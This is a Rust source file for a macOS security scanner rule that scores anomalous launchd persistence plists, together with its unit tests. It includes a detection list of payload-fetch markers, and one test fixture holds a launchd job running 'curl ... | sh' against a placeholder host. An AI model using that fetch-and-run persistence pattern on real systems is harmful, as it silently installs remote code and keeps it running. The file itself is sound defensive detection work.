//! LaunchAgent / LaunchDaemon persistence-anomaly detection (§5.2).
//!
//! **Purely static**: reads a launchd job plist's content and path, and makes
//! no claim about which process installed it (that is §5.3 behavioral work).
//! A well-formed ordinary LaunchAgent scores **nothing** — every point comes
//! from a specific anomaly, and the rule contributes one category
//! (`BehavioralConcern`), so alone it can't exceed a `Notify` verdict.

use std::path::Path;

use super::{Rule, RuleOutcome};
use crate::context::ScanContext;
use crate::model::{MatchedSignal, SignalCategory};
use crate::plist::{self, PlistValue};

/// Weight ceiling for this rule's single signal — comfortably in `Notify`
/// range, never near the high-severity threshold.
const MAX_WEIGHT: i32 = 30;
/// A `StartInterval` shorter than this (seconds) reads as beaconing rather
/// than a normal periodic maintenance job.
const SHORT_INTERVAL_SECS: i64 = 300;

pub struct LaunchdPersistenceRule;

impl Default for LaunchdPersistenceRule {
    fn default() -> Self {
        LaunchdPersistenceRule
    }
}

impl Rule for LaunchdPersistenceRule {
    fn id(&self) -> &'static str {
        "launchd-persistence-plist"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::BehavioralConcern
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;

        // A prefix of a plist can't be judged — the deciding keys may be past
        // the cap, and XML still parses from a prefix. "Couldn't check", not
        // "clean" (§10, §11.8). Scoped to plist-looking targets.
        if ctx.truncated && (!ctx.is_file_backed() || looks_like_plist_target(&ctx.path)) {
            return Err(RuleOutcome::NotApplicable);
        }

        let parsed = match plist::parse(content) {
            Some(v) => v,
            None => {
                // A file that should be a plist but won't parse is "couldn't
                // check" (§10, §11.8); anything else isn't this rule's concern.
                return if ctx.is_file_backed() && looks_like_plist_target(&ctx.path) {
                    Err(RuleOutcome::NotApplicable)
                } else {
                    Ok(None)
                };
            }
        };

        let Some(job) = LaunchdJob::from_plist(&parsed) else {
            return Ok(None); // parsed fine — just not a launchd job
        };

        let mut findings: Vec<(i32, String)> = Vec::new();

        if job.run_at_load && job.keep_alive {
            findings.push((
                8,
                "RunAtLoad + KeepAlive — starts at login and is relaunched if killed".to_string(),
            ));
        }
        if let Some(exe) = job.program_in_unusual_location() {
            findings.push((
                12,
                format!("executes a program from an unusual location: {exe}"),
            ));
        }
        if job.runs_inline_script() {
            findings.push((
                12,
                "runs an inline interpreter script (sh -c / osascript -e) that fetches or decodes"
                    .to_string(),
            ));
        }
        if let Some(secs) = job.short_start_interval() {
            findings.push((
                6,
                format!("StartInterval {secs}s (< 5 min) — possible beaconing"),
            ));
        }
        // Location heuristics need a real path — container-extracted content's
        // "path" is a label this crate invented.
        if ctx.is_file_backed() {
            if let Some(place) = staged_location(&ctx.path) {
                findings.push((10, format!("launchd job plist staged {place}")));
            }
        }

        if findings.is_empty() {
            return Ok(None);
        }

        let weight = findings.iter().map(|(w, _)| w).sum::<i32>().min(MAX_WEIGHT);
        let description = format!(
            "launchd job '{}': {}",
            job.label.unwrap_or("(no Label)"),
            findings
                .iter()
                .map(|(_, d)| d.as_str())
                .collect::<Vec<_>>()
                .join("; ")
        );

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight,
            description,
            category: self.category(),
        }))
    }
}

/// The launchd job keys this rule looks at, extracted from a parsed plist.
struct LaunchdJob<'a> {
    label: Option<&'a str>,
    run_at_load: bool,
    keep_alive: bool,
    start_interval: Option<i64>,
    /// `Program` (if present) followed by `ProgramArguments`, in invocation
    /// order — the first entry is the executable.
    argv: Vec<&'a str>,
}

impl<'a> LaunchdJob<'a> {
    /// `Some` only if `v` is a dict with a `Label` **and** a `Program` or
    /// `ProgramArguments` — i.e. an actual launchd job, not some other plist.
    fn from_plist(v: &'a PlistValue) -> Option<Self> {
        v.as_dict()?; // must be a dict

        let program = v.get("Program").and_then(PlistValue::as_str);
        let args: Vec<&str> = v
            .get("ProgramArguments")
            .and_then(PlistValue::as_array)
            .map(|a| a.iter().filter_map(PlistValue::as_str).collect())
            .unwrap_or_default();

        let label = v.get("Label").and_then(PlistValue::as_str);
        if label.is_none() || (program.is_none() && args.is_empty()) {
            return None;
        }

        let mut argv = Vec::new();
        argv.extend(program);
        argv.extend(args);

        Some(LaunchdJob {
            label,
            run_at_load: truthy(v.get("RunAtLoad")),
            keep_alive: truthy(v.get("KeepAlive")),
            start_interval: v.get("StartInterval").and_then(PlistValue::as_i64),
            argv,
        })
    }

    fn executable(&self) -> Option<&str> {
        self.argv.first().copied()
    }

    /// The executable path if it sits somewhere a legitimate launchd job's
    /// program almost never does — a temp/cache tree or a hidden directory.
    fn program_in_unusual_location(&self) -> Option<&str> {
        let exe = self.executable()?;
        const TRANSIENT_PREFIXES: &[&str] = &[
            "/tmp/",
            "/private/tmp/",
            "/var/tmp/",
            "/private/var/tmp/",
            "/var/folders/",
            "/private/var/folders/",
            "/Users/Shared/",
        ];
        let in_transient = TRANSIENT_PREFIXES.iter().any(|p| exe.starts_with(p));
        let hidden = hidden_component(exe)
            .is_some_and(|(name, under_home)| !(under_home && TOOL_ROOTS.contains(&name)));
        (in_transient || hidden).then_some(exe)
    }

    /// True if the job invokes a shell / `osascript` with an inline script
    /// (`-c` / `-e`) that pulls or decodes a payload — the launchd-as-loader
    /// pattern, distinct from a job that runs a real on-disk program.
    fn runs_inline_script(&self) -> bool {
        let exe = self.executable().unwrap_or_default();
        let is_shell_c =
            (exe.ends_with("sh") || exe.ends_with("/env")) && self.argv.contains(&"-c");
        let is_osascript_e =
            self.argv.iter().any(|a| a.contains("osascript")) && self.argv.contains(&"-e");
        if !is_shell_c && !is_osascript_e {
            return false;
        }
        let joined = self.argv.join(" ");
        ["base64", "curl", "| sh", "| bash", "eval ", "python"]
            .iter()
            .any(|m| joined.contains(m))
    }

    fn short_start_interval(&self) -> Option<i64> {
        self.start_interval
            .filter(|&n| n > 0 && n < SHORT_INTERVAL_SECS)
    }
}

/// Per-user dot-directories developer tooling installs into (`pipx`,
/// `cargo install`, `nvm`, …). Only honoured directly under a home directory
/// (see [`hidden_component`]), so `/Applications/X.app/.cargo/evil` still scores.
const TOOL_ROOTS: &[&str] = &[
    ".bun",
    ".cargo",
    ".deno",
    ".docker",
    ".dotnet",
    ".local",
    ".npm-global",
    ".nvm",
    ".orbstack",
    ".pyenv",
    ".rbenv",
    ".rustup",
    ".sdkman",
    ".volta",
    ".yarn",
];

/// The first hidden (`.`-prefixed) component of `path`, and whether it sits
/// directly under a home directory (`/Users/<name>/<here>`) — the position
/// that separates a tool root from a payload hidden deeper in a tree.
fn hidden_component(path: &str) -> Option<(&str, bool)> {
    let parts: Vec<&str> = path.split('/').collect();
    parts.iter().enumerate().find_map(|(i, c)| {
        let hidden = c.len() > 1 && c.starts_with('.') && *c != "..";
        hidden.then(|| {
            let under_home = i == 3 && parts.first() == Some(&"") && parts.get(1) == Some(&"Users");
            (*c, under_home)
        })
    })
}

/// `RunAtLoad`/`KeepAlive` are usually bools, but `KeepAlive` may also be a
/// condition dict — its mere presence means "keep this alive".
fn truthy(v: Option<&PlistValue>) -> bool {
    matches!(v, Some(PlistValue::Bool(true)) | Some(PlistValue::Dict(_)))
}

/// Is `path` something we'd expect to *be* a plist — so a parse failure is a
/// coverage gap rather than a non-match?
fn looks_like_plist_target(path: &Path) -> bool {
    if path
        .extension()
        .is_some_and(|e| e.eq_ignore_ascii_case("plist"))
    {
        return true;
    }
    path.components().any(|c| {
        let s = c.as_os_str().to_string_lossy();
        s == "LaunchAgents" || s == "LaunchDaemons"
    })
}

/// If the job plist itself is sitting somewhere transient rather than in an
/// installed `LaunchAgents`/`LaunchDaemons` location — bundled in an app, or on
/// a mounted volume — that is "staged persistence not yet installed".
fn staged_location(path: &Path) -> Option<&'static str> {
    let s = path.to_string_lossy();
    // `Contents/Library/Launch{Agents,Daemons}/` is the *installed* location
    // for an app's SMAppService/SMJobBless helper, not staging — scoring it
    // would flag every app that ships a privileged helper (§1).
    const BUNDLED_HELPER_DIRS: &[&str] = &[
        "/Contents/Library/LaunchDaemons/",
        "/Contents/Library/LaunchAgents/",
    ];
    if BUNDLED_HELPER_DIRS.iter().any(|d| s.contains(d)) {
        return None;
    }

    if s.contains("/Contents/") {
        Some("inside an .app bundle")
    } else if s.contains("/Volumes/") {
        Some("on a mounted volume")
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn ctx(path: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            path: PathBuf::from(path),
            content: Some(body.to_vec()),
            truncated: false,
            file_len: Some(body.len() as u64),
            source: crate::context::ContentSource::File,
            codesign_dv_cache: std::sync::OnceLock::new(),
            spctl_cache: std::sync::OnceLock::new(),
        }
    }

    fn eval(path: &str, body: &[u8]) -> Result<Option<MatchedSignal>, RuleOutcome> {
        LaunchdPersistenceRule.evaluate(&ctx(path, body))
    }

    const ORDINARY: &[u8] = br#"<plist version="1.0"><dict>
        <key>Label</key><string>com.example.helper</string>
        <key>ProgramArguments</key>
        <array><string>/usr/local/bin/example-helper</string><string>--foreground</string></array>
        <key>RunAtLoad</key><true/>
    </dict></plist>"#;

    #[test]
    fn ordinary_launch_agent_scores_nothing() {
        assert!(matches!(
            eval(
                "/Users/x/Library/LaunchAgents/com.example.helper.plist",
                ORDINARY
            ),
            Ok(None)
        ));
    }

    #[test]
    fn run_at_load_plus_keep_alive_with_hidden_program_is_flagged() {
        let body = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.apple.softwareupdate</string>
            <key>Program</key><string>/Users/x/Library/.cache/update</string>
            <key>RunAtLoad</key><true/>
            <key>KeepAlive</key><true/>
        </dict></plist>"#;
        let sig = eval(
            "/Users/x/Library/LaunchAgents/com.apple.softwareupdate.plist",
            body,
        )
        .unwrap()
        .expect("should fire");
        assert_eq!(sig.category, SignalCategory::BehavioralConcern);
        assert!(sig.weight >= 15 && sig.weight <= MAX_WEIGHT);
    }

    #[test]
    fn inline_loader_script_is_flagged() {
        let body = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.x.updater</string>
            <key>ProgramArguments</key>
            <array><string>/bin/sh</string><string>-c</string>
              <string>curl -s https://x.test/a | sh</string></array>
        </dict></plist>"#;
        let sig = eval("/tmp/com.x.updater.plist", body)
            .unwrap()
            .expect("fires");
        assert!(sig.description.contains("inline interpreter script"));
    }

    #[test]
    fn plist_in_a_bundle_is_staged_persistence() {
        let body = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.x.helper</string>
            <key>Program</key><string>/Applications/X.app/Contents/Helpers/x</string>
            <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
        </dict></plist>"#;
        let sig = eval(
            "/Applications/X.app/Contents/Library/LaunchServices/com.x.helper.plist",
            body,
        )
        .unwrap()
        .expect("fires");
        assert!(sig.description.contains("staged inside an .app bundle"));
    }

    #[test]
    fn bundled_sm_app_service_helper_is_not_staged_persistence() {
        // Apple's documented layout for an app's privileged helper — reached
        // `notify` at 18 before the location carve-out.
        let body = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.example.widget.helper</string>
            <key>ProgramArguments</key>
            <array><string>Contents/MacOS/WidgetHelper</string></array>
            <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
        </dict></plist>"#;
        let sig = eval(
            "/Applications/Widget.app/Contents/Library/LaunchDaemons/com.example.widget.helper.plist",
            body,
        )
        .unwrap();
        assert!(
            sig.as_ref().is_none_or(|s| s.weight < 15),
            "bundled helper must not reach notify on its own: {sig:?}"
        );
    }

    #[test]
    fn a_program_in_a_per_user_tool_root_is_not_an_unusual_location() {
        // ~/.local/bin, ~/.cargo/bin etc. — a LaunchAgent pointing at one is ordinary.
        let body = br#"<plist version="1.0"><dict>
            <key>Label</key><string>com.example.devtool</string>
            <key>ProgramArguments</key>
            <array><string>/Users/alice/.local/bin/devtool</string></array>
            <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
        </dict></plist>"#;
        let sig = eval(
            "/Users/alice/Library/LaunchAgents/com.example.devtool.plist",
            body,
        )
        .unwrap();
        assert!(
            sig.as_ref().is_none_or(|s| s.weight < 15),
            "a tool-root program must not reach notify on its own: {sig:?}"
        );
    }

    #[test]
    fn a_tool_root_name_deeper_in_a_tree_is_still_an_anomaly() {
        // Positional: `.cargo` directly under a home dir is a tool root, elsewhere not.
        assert!(matches!(
            hidden_component("/Users/alice/.cargo/bin/x"),
            Some((".cargo", true))
        ));
        assert!(matches!(
            hidden_component("/Applications/X.app/.cargo/evil"),
            Some((".cargo", false))
        ));
        assert!(matches!(
            hidden_component("/Users/alice/Library/.cache/update"),
            Some((".cache", false))
        ));
        assert_eq!(hidden_component("/usr/local/bin/tool"), None);
        // A relative `..` is not a hidden component.
        assert_eq!(hidden_component("/usr/local/../bin/tool"), None);
    }

    #[test]
    fn a_truncated_plist_is_not_applicable_not_clean() {
        let c = ScanContext {
            path: PathBuf::from("/Library/LaunchDaemons/huge.plist"),
            content: Some(ORDINARY.to_vec()),
            truncated: true,
            file_len: Some(64 * 1024 * 1024),
            source: crate::context::ContentSource::File,
            codesign_dv_cache: std::sync::OnceLock::new(),
            spctl_cache: std::sync::OnceLock::new(),
        };
        assert!(matches!(
            LaunchdPersistenceRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn non_launchd_plist_does_not_apply() {
        let info = br#"<plist version="1.0"><dict>
            <key>CFBundleExecutable</key><string>Thing</string>
        </dict></plist>"#;
        assert!(matches!(
            eval("/Applications/Thing.app/Contents/Other.plist", info),
            Ok(None)
        ));
    }

    #[test]
    fn unparseable_dot_plist_is_not_applicable_not_clean() {
        assert!(matches!(
            eval(
                "/Library/LaunchDaemons/broken.plist",
                b"\x00\x01 not a plist \xff"
            ),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn non_plist_file_is_simply_no_match() {
        assert!(matches!(
            eval("/usr/local/bin/tool", b"#!/bin/sh\necho hi\n"),
            Ok(None)
        ));
    }

    #[test]
    fn unreadable_content_is_not_applicable() {
        let c = ScanContext {
            path: PathBuf::from("/Library/LaunchDaemons/x.plist"),
            content: None,
            truncated: false,
            file_len: None,
            source: crate::context::ContentSource::File,
            codesign_dv_cache: std::sync::OnceLock::new(),
            spctl_cache: std::sync::OnceLock::new(),
        };
        assert!(matches!(
            LaunchdPersistenceRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }
}
